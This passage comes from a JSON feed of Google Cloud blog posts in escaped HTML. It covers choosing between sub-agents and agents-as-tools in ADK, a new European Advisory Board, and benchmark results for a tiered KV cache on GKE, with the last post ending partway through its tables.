either by constantly passing full conversational history to a simple function or by under-utilizing the context-sharing capabilities of a more complex system.</span></p>\n<p><span style=\"vertical-align: baseline;\">While both sub-agents and tools help break down complex problems, they serve different purposes. The key difference is how they handle </span><strong style=\"vertical-align: baseline;\">control</strong><span style=\"vertical-align: baseline;\"> and </span><strong style=\"vertical-align: baseline;\">context</strong><span style=\"vertical-align: baseline;\">. </span></p>\n<h3><strong style=\"vertical-align: baseline;\">Agents as tools: The specialist on call</strong></h3>\n<p><span style=\"vertical-align: baseline;\">An agent as a tool is a self-contained expert agent packaged for a </span><strong style=\"vertical-align: baseline;\">specific, discrete task</strong><span style=\"vertical-align: baseline;\">, like a specialized function call. The main agent calls the tool with a clear input and gets a direct output, operating like a transactional API. The main agent doesn't need to worry about </span><span style=\"font-style: italic; vertical-align: baseline;\">how</span><span style=\"vertical-align: baseline;\"> the tool works; it only needs a reliable result. This pattern is ideal for independent and reusable tasks.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Key characteristics:</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Encapsulated and reusable:</strong><span style=\"vertical-align: baseline;\"> The internal logic is hidden, making the tool easy to reuse across different agents.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Isolated context:</strong><span style=\"vertical-align: baseline;\"> The tool runs in its own session and cannot access the calling agent’s conversation history or state.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Stateless:</strong><span style=\"vertical-align: baseline;\"> The interaction is stateless. The tool receives all the information it needs in a single request.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Strict input/output:</strong><span style=\"vertical-align: baseline;\"> It operates based on a well-defined contract.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Sub-agents: The delegated team member</strong></h3>\n<p><span style=\"vertical-align: baseline;\">A sub-agent is a </span><strong style=\"vertical-align: baseline;\">delegated team member</strong><span style=\"vertical-align: baseline;\"> that handles a complex, multi-step process. This is a hierarchical and collaborative relationship where the sub-agent works within the </span><strong style=\"vertical-align: baseline;\">broader context</strong><span style=\"vertical-align: baseline;\"> of the parent agent's mission. Use sub-agents for tasks that require a chain of reasoning or a series of interactions.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Key characteristics:</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Tightly coupled and integrated:</strong><span style=\"vertical-align: baseline;\"> Sub-agents are part of a larger, defined workflow. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Shared context:</strong><span style=\"vertical-align: baseline;\"> They operate within the same session and can access the parent's conversation history and state, allowing for more nuanced collaboration.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Stateful processes:</strong><span style=\"vertical-align: baseline;\"> They are ideal for managing processes where the task requires several steps to complete. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Hierarchical delegation:</strong><span style=\"vertical-align: baseline;\"> The parent agent explicitly delegates a high-level task and lets the sub-agent manage the process.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Here is a simple decision matrix that you can use to guide your architectural decision based on the task:</span></p>\n<div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table style=\"width: 100%;\"><colgroup><col style=\"width: 18.4314%;\" /><col style=\"width: 19.7386%;\" /><col style=\"width: 17.2518%;\" /><col style=\"width: 44.5782%;\" /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Criterion</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Agent as a tool</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Sub-agent</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Decision</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Task complexity</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Low to Medium</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">High</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Use a </span><strong style=\"vertical-align: baseline;\">tool</strong><span style=\"vertical-align: baseline;\"> for atomic functions. Use a </span><strong style=\"vertical-align: baseline;\">sub-agent</strong><span style=\"vertical-align: baseline;\"> for complex workflows.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Context &amp; state</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Isolated/None</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Shared</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">If the task is stateless, use a </span><strong style=\"vertical-align: baseline;\">tool</strong><span style=\"vertical-align: baseline;\">. If it requires conversational context, use a </span><strong style=\"vertical-align: baseline;\">sub-agent</strong><span style=\"vertical-align: baseline;\">.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Reusability</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">High</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Low to Medium</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">For generic, widely applicable capabilities, build a </span><strong style=\"vertical-align: baseline;\">tool</strong><span style=\"vertical-align: baseline;\">. For specialized roles in a specific process, use a </span><strong style=\"vertical-align: baseline;\">sub-agent</strong><span style=\"vertical-align: baseline;\">.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Autonomy &amp; control</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Low</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">High</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Use a </span><strong style=\"vertical-align: baseline;\">tool</strong><span style=\"vertical-align: baseline;\"> for a simple request-response. Use a </span><strong style=\"vertical-align: baseline;\">sub-agent</strong><span style=\"vertical-align: baseline;\"> for delegating a whole sub-problem.</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<h3><strong style=\"vertical-align: baseline;\">Use cases in action</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Let's apply this framework to some real-world scenarios. </span></p>\n<p><strong style=\"vertical-align: baseline;\">Use case 1: The data agent (NL2SQL and visualization)</strong></p>\n<p><span style=\"vertical-align: baseline;\">A business user asks for the top 5 product sales in Q2 by region and wants a bar chart. </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Root Agent : </strong><span style=\"vertical-align: baseline;\">Receives the business user's request (NL), determines the necessary steps (SQL generation → Execution → Visualization), and delegates/sequences the tasks, before returning the response to the user. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">NL2SQL Agent:</strong><span style=\"vertical-align: baseline;\"> Use a </span><strong style=\"vertical-align: baseline;\">tool</strong><span style=\"vertical-align: baseline;\">. The task is a single, reusable function: convert natural language to a SQL string, using metadata &amp; schema for grounding.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Database Executor:</strong><span style=\"vertical-align: baseline;\"> Use a </span><strong style=\"vertical-align: baseline;\">tool</strong><span style=\"vertical-align: baseline;\">. This is a simple, deterministic function to execute the query and return data.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Data Visualization Agent:</strong><span style=\"vertical-align: baseline;\"> Use a </span><strong style=\"vertical-align: baseline;\">sub-agent</strong><span style=\"vertical-align: baseline;\">. The task is complex and multi-step. It involves analyzing the data returned by the database tool, and the original user query, selecting the right chart type, generating the visualization code, and executing it. Delegating this to a sub-agent allows the main orchestrator agent to maintain a high-level view while the sub-agent independently manages its complex internal workflow.</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">Use case 2: The sophisticated travel planner</strong></p>\n<p><span style=\"vertical-align: baseline;\">A user asks to plan a 5-day anniversary trip to Paris, with specific preferences for flights, hotels, and activities. This is an ambiguous, high-level goal that requires continuous context and planning. </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Travel planner: </strong><span style=\"vertical-align: baseline;\">Use a </span><strong style=\"vertical-align: baseline;\">root agent</strong><span style=\"vertical-align: baseline;\">, to maintain the overall goal (\"5-day anniversary trip to Paris\"),manage the flow between sub-agents, and aggregate the final itinerary.<br /><br /></span><span style=\"font-style: italic; vertical-align: baseline;\">Note: </span><span style=\"vertical-align: baseline;\">You could implement a Context/Memory Manager Tool accessible to all agents, potentially using a simple key-value store (like Redis or a simple database) to delegate the storage of immutable decisions. </span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Flight search:</strong><span style=\"vertical-align: baseline;\"> Use a </span><strong style=\"vertical-align: baseline;\">sub-agent</strong><span style=\"vertical-align: baseline;\">. The task is not a simple search; involving multiple back-and-forth interactions with the user (e.g., \"Is a layover in Dubai okay?\") while managing the overall trip context (dates, destination, class). </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Hotel booking:</strong><span style=\"vertical-align: baseline;\"> Use a </span><strong style=\"vertical-align: baseline;\">sub-agent</strong><span style=\"vertical-align: baseline;\">. It needs to maintain state and context (dates, location preference, 5-star rating) as it searches for and presents options.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Itinerary generation:</strong><span style=\"vertical-align: baseline;\"> Use a </span><strong style=\"vertical-align: baseline;\">sub-agent</strong><span style=\"vertical-align: baseline;\"> to generate a logical, day-by-day itinerary. The agent must combine confirmed flights/hotels with user interests (e.g., art museums, fine dining), potentially using its own booking tools.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Using tools is inefficient; each call requires the full trip context, leading to redundancy and state loss. Sub-agents are better for these stateful, collaborative processes as they share session context.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Get started</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The decision between sub-agents and agents as tools is fundamental to designing an effective and scalable agentic system in ADK. As a guiding principle, remember: </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Use tools</strong><span style=\"vertical-align: baseline;\"> for discrete, stateless, and reusable capabilities. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Use sub-agents</strong><span style=\"vertical-align: baseline;\"> to manage complex, stateful, and context-dependent processes. </span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">By mastering this architectural pattern, you can design multi-agent systems that are modular and capable of solving complex, real-world problems. </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Check out these </span><a href=\"https://github.com/google/adk-samples\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">examples</span></a><span style=\"vertical-align: baseline;\"> on GitHub to start building using ADK. </span></p>\n</li>\n<li><span style=\"vertical-align: baseline;\">Here is a fantastic </span><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/build-multi-agentic-systems-using-google-adk\"><span style=\"text-decoration: underline; vertical-align: baseline;\">blogpost</span></a><span style=\"vertical-align: baseline;\"> that will help you build your first multi-agent workflow.</span></li>\n</ul></div>",
        "published_date": "2025-11-07 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/customers/google-cloud-europe-establishes-new-advisory-board/",
        "title": "Google Cloud Europe establishes new European Advisory Board",
        "thumbnail": null,
        "author": "Tara Brady",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Across the world, organizations are partnering with Google Cloud to tackle their toughest challenges, drive digital transformation, and unlock new levels of growth. In Europe, organizations face unique and complex regulatory challenges. To ensure we're delivering the best possible value and experience for our customers here, we have established a new European Advisory Board. This distinguished group of leaders from across various industries will act as a vital feedback channel, help customers navigate complex regulatory landscapes, and foster a strong, sustainable digital economy. Their counsel is key to ensuring Google Cloud products not only meet but exceed European requirements, driving our regional expertise and differentiation and ultimately supporting Europe’s digital transformation.</span></p>\n<p><span style=\"vertical-align: baseline;\">The board comprises renowned leaders with deep expertise spanning technology, finance, retail, and public service. </span></p>\n<p><span style=\"vertical-align: baseline;\">The new board members are:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Jim Snabe (Chair):</strong><span style=\"vertical-align: baseline;\"> A global business leader and current Chairman of Siemens AG. With a long career at the intersection of technology and innovation, including his time as Co-CEO of SAP AG, Jim brings deep expertise in guiding multinational organizations through digital transformation and growth. His leadership will be pivotal in steering the board’s strategic direction.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Stefan F Heidenreich:</strong><span style=\"vertical-align: baseline;\"> A business leader with extensive experience in the consumer goods industry, including as Chairman of the Management Board and CEO of Beiersdorf AG. His knowledge of brand management, market strategy, and organizational leadership will provide valuable commercial insights.</span><span style=\"vertical-align: baseline;\"> </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Nigel Hinshelwood:</strong><span style=\"vertical-align: baseline;\"> An expert in financial services with significant leadership roles at institutions like HSBC and Lloyds Banking Group. His understanding of Europe’s financial sector and regulatory environment will be crucial for guiding Google Cloud's work with major banking and financial services clients.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Christophe Cuvillier:</strong><span style=\"vertical-align: baseline;\"> A prominent French businessman and former CEO of Unibail-Rodamco-Westfield. With a background in luxury, retail, and real estate, Christophe's perspective on customer-centricity and business transformation in the consumer sector will be a key asset to the board.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Tim Radford (from Jan 2026):</strong><span style=\"vertical-align: baseline;\"> A former British military leader and operational commander with a background in defense and large-scale project delivery. His insights into leveraging technology to achieve strategic business objectives will be vital to the board's discussions.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">\"It is a privilege to chair Google Cloud’s EMEA advisory board,\" said Jim Snabe. \"Europe is at a critical juncture in its digital evolution. This board's mission is to provide counsel that helps Google Cloud not only accelerate innovation but also ensure it is done in a way that aligns with Europe’s values and priorities, fostering a secure and inclusive digital future.\"</span></p>\n<p><span style=\"vertical-align: baseline;\">The formation of this board underscores Google Cloud's ongoing commitment to a European-first strategy, collaborating closely with local leaders to build technology solutions that are tailored to the continent's unique needs and opportunities. The board will meet periodically to advise Google Cloud leadership on a range of strategic issues, from product development and market entry to policy and sustainability initiatives.</span></p></div>",
        "published_date": "2025-11-07 16:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/developers-practitioners/boosting-llm-performance-with-tiered-kv-cache-on-google-kubernetes-engine/",
        "title": "Boosting LLM Performance with Tiered KV Cache on Google Kubernetes Engine",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/heroimageblog.max-600x600.png",
        "author": "Danna Wang",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Large Language Models (LLMs) are powerful, but their performance can be bottlenecked by the immense NVIDIA GPU memory footprint of the Key-Value (KV) Cache. This cache, crucial for speeding up LLM inference by storing Key (K) and Value (V) matrices, directly impacts context length, concurrency, and overall system throughput. Our primary goal is to maximize the KV Cache hit ratio by intelligently expanding NVIDIA GPU High Bandwidth Memory (HBM) with a tiered node-local storage solution.</span></p>\n<p><span style=\"vertical-align: baseline;\">Our collaboration with the LMCache team (Kuntai Du, Jiayi Yao, and Yihua Cheng from Tensormesh) has led to the development of an innovative solution on Google Kubernetes Engine (GKE).</span></p>\n<h2><span style=\"vertical-align: baseline;\">T</span><span style=\"vertical-align: baseline;\">iered Storage: Expanding the KV Cache Beyond HBM</span></h2>\n<p><span style=\"vertical-align: baseline;\">LMCache extends the KV Cache from the NVIDIA GPU's fast HBM (Tier 1) to larger, more cost-effective tiers like CPU RAM and local SSDs. This dramatically increases the total cache size, leading to a higher hit ratio and improved inference performance by keeping more data locally on the accelerator node. For GKE users, this means accommodating models with massive context windows while maintaining excellent performance.</span></p>\n<h2><strong style=\"vertical-align: baseline;\">Performance Benchmarking and Results</strong></h2>\n<p><span style=\"vertical-align: baseline;\">We designed tests to measure the performance of this tiered KV Cache by configuring workloads to fill each storage layer (HBM, CPU RAM, Local SSD). We benchmarked these configurations using various context lengths (1k, 5k, 10k, 50k, and 100k tokens), representing diverse use cases such as:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">1k - 5k tokens:</strong><span style=\"vertical-align: baseline;\"> High-fidelity personas and complex instructions</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">10k tokens:</strong><span style=\"vertical-align: baseline;\"> Average user prompts (small RAG) or web page/article content</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">50k tokens:</strong><span style=\"vertical-align: baseline;\"> Prompt stuffing</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">100k tokens:</strong><span style=\"vertical-align: baseline;\"> Content equivalent to a long book</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Our primary performance indicators were Time to First Token (TTFT), token input throughput, and end-to-end latency. The results highlight the best-performing storage setup for each KV Cache size and the performance improvements achieved.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Experiment Setup</span></h2>\n<p><span style=\"vertical-align: baseline;\">We deployed a vLLM server on an </span><a href=\"https://cloud.google.com/compute/docs/gpus#h100-gpus\"><span style=\"text-decoration: underline; vertical-align: baseline;\">A3 mega machine</span></a><span style=\"vertical-align: baseline;\">, leveraging local SSD for ephemeral storage via </span><code style=\"vertical-align: baseline;\">emptyDir</code><span style=\"vertical-align: baseline;\">.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Hardware:</strong><span style=\"vertical-align: baseline;\"> 8 × nvidia-h100-mega-80gb NVIDIA GPUs</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Model:</strong><span style=\"vertical-align: baseline;\"> </span><a href=\"https://huggingface.co/meta-llama/Llama-3.3-70B-Instruct\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Llama-3.3-70B-Instruct</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">LMCache version:</strong><span style=\"vertical-align: baseline;\"> </span><a href=\"https://hub.docker.com/layers/lmcache/vllm-openai/v0.3.3/images/sha256-51eb3ca2e0f93cd9b4f44b099ef4e13f6290eaafbf814ac1c23494d2c25bf8a9\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">v0.3.3</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Cache Configuration:</strong></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">HBM only</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">HBM + CPU RAM</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">HBM + CPU RAM + Local SSD</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Storage Resources:</strong><span style=\"vertical-align: baseline;\"> HBM: 640Gi, CPU RAM: 1Ti, Local SSD: 5Ti</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Benchmark Tool:</strong><span style=\"vertical-align: baseline;\"> </span><a href=\"https://github.com/sgl-project/sglang/blob/main/python/sglang/bench_serving.py\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">SGLang bench_serving</span></a></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\"><strong style=\"vertical-align: baseline;\">Requests:</strong><span style=\"vertical-align: baseline;\"> Tests were conducted with system prompt lengths of 1k, 5k, 10k, 50k, and 100k tokens. Each system prompt provided a shared context for a batch of 20 inference requests, with individual requests consisting of a unique 256-token input and generating a 512-token output.</span></span></p>\n<p><strong style=\"vertical-align: baseline;\">Example Command:</strong></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &quot;python3 sglang/bench_serving.py --host=${IP} --port=${PORT} --dataset-name=&#x27;generated-shared-prefix&#x27; --model=$MODEL --tokenizer=$MODEL --backend=vllm --gsp-num-groups=80 --gsp-&quot;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f9153bd4310&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Benchmark Results</span></h2>\n<p><span style=\"vertical-align: baseline;\">Our tests explored different total KV Cache sizes. The following results highlight the optimal storage setup for each size and the performance improvements achieved:</span></p>\n<h3><span style=\"vertical-align: baseline;\">Test 1: Cache (1.1M - 1.3M tokens) fits entirely within HBM</span></h3>\n<p><strong style=\"vertical-align: baseline;\">Results:</strong><span style=\"vertical-align: baseline;\"> In this scenario, adding slower storage tiers provided no advantage, making an HBM-only configuration the optimal setup.</span></p>\n<h3><span style=\"vertical-align: baseline; color: #202124;\"><span style=\"vertical-align: baseline;\">Test 2: Cache (4.0M - 4.3M tokens) exceeds HBM capacity but fits within HBM + CPU RAM</span></span></h3>\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 100%; height: 179.187px;\">\n<tbody>\n<tr style=\"height: 67.1953px;\">\n<td style=\"width: 20%; text-align: center; height: 67.1953px;\"><strong><span style=\"vertical-align: baseline;\">System Prompt Length</span></strong></td>\n<td style=\"width: 20%; text-align: center; height: 67.1953px;\"><strong><span style=\"vertical-align: baseline;\">Best-performing Storage Setup</span></strong></td>\n<td style=\"width: 20%; text-align: center; height: 67.1953px;\"><strong><span style=\"vertical-align: baseline;\">Mean TTFT (ms) Change (%) vs. HBM only</span></strong></td>\n<td style=\"width: 20%; text-align: center; height: 67.1953px;\"><strong><span style=\"vertical-align: baseline;\">Input Throughput Change (%) vs. HBM only</span></strong></td>\n<td style=\"width: 20%; text-align: center; height: 67.1953px;\"><strong><span style=\"vertical-align: baseline;\">Mean End-to-End Latency Change (%) vs. HBM only</span></strong></td>\n</tr>\n<tr style=\"height: 22.3984px;\">\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">1000</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">HBM</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">0%</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">0%</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">0%</span></td>\n</tr>\n<tr style=\"height: 22.3984px;\">\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">5000</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">HBM + CPU RAM</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">-18%</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">+16%</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">-14%</span></td>\n</tr>\n<tr style=\"height: 22.3984px;\">\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">10000</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">HBM + CPU RAM</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">-44%</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">+50%</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">-33%</span></td>\n</tr>\n<tr style=\"height: 22.3984px;\">\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">50000</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">HBM + CPU RAM + Local SSD</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">-68%</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">+179%</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">-64%</span></td>\n</tr>\n<tr style=\"height: 22.3984px;\">\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">100000</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">HBM + CPU RAM + Local SSD</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">-79%</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">+264%</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">-73%</span></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<h3><span style=\"vertical-align: baseline; color: #202124;\">Test 3: Large cache (12.6M - 13.7M tokens) saturates HBM and CPU RAM, spilling to Local SSD</span></h3>\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\">\n<tbody>\n<tr>\n<td style=\"text-align: center; border: 1px solid #000000; padding: 16px;\"><strong><span style=\"vertical-align: 